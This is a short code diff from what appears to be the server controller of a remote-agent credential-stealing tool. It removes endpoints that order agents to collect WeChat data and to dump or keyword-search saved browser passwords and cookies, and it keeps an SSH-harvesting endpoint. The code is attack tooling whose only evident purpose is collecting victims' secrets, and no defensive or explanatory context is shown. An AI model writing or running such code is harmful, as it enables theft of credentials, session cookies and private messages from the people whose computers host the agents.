@@ -27,32 +27,6 @@ public class OtherSoftController : ControllerBase
         return Content(response, "application/json");
     }
 
-    [HttpPost("{agentId}/wechat")]
-    public async Task<IActionResult> GetWeChat(string agentId, CancellationToken ct)
-    {
-        return await RelayAndWaitAsync(agentId, new { op = "wechat" }, ct);
-    }
-
-    [HttpPost("{agentId}/browser")]
-    public async Task<IActionResult> GetBrowser(string agentId, [FromBody] JsonElement body, CancellationToken ct)
-    {
-        var type = body.TryGetProperty("type", out var t) ? t.GetString() ?? "passwords" : "passwords";
-        var offset = body.TryGetProperty("offset", out var o) ? o.GetInt32() : 0;
-        var limit = body.TryGetProperty("limit", out var l) ? l.GetInt32() : 250;
-        var timeout = type == "cookies" ? 60 : 30;
-        return await RelayAndWaitAsync(agentId, new { op = "browser", type, offset, limit }, ct, timeout);
-    }
-
-    [HttpPost("{agentId}/browser/search")]
-    public async Task<IActionResult> SearchBrowser(string agentId, [FromBody] JsonElement body, CancellationToken ct)
-    {
-        var type = body.TryGetProperty("type", out var t) ? t.GetString() ?? "all" : "all";
-        var keyword = body.TryGetProperty("keyword", out var k) ? k.GetString() ?? "" : "";
-        if (string.IsNullOrWhiteSpace(keyword))
-            return BadRequest(new { error = "keyword is required" });
-        return await RelayAndWaitAsync(agentId, new { op = "browser_search", type, keyword }, ct, 60);
-    }
-
     [HttpPost("{agentId}/ssh")]
     public async Task<IActionResult> GetSSH(string agentId, CancellationToken ct)
     {
